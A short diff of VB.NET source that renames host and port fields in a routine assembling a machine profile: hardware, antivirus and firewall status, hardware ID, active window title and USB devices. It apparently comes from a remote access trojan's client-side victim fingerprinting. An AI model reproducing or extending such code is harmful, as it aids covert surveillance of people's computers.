@@ -377,8 +377,8 @@ Public Class ID
             GPU() & SPL &
             FormatNumber(My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024, 2) & " GB " & SPL &
             My.Computer.Screen.Bounds.Size.ToString & SPL &
-            Main._H & SPL &
-            Main._P & SPL &
+            Main.HOST & SPL &
+            Main.PORT & SPL &
             Application.ExecutablePath & SPL &
             LastReboot() & SPL &
             AV() & SPL &
@@ -388,7 +388,7 @@ Public Class ID
             HWID() & SPL &
             ActiveWindow() & SPL &
             FW() & SPL &
-            ListUSB() & SPL
+            ListUSB()
         Catch
             Return "N/A"
         End Try
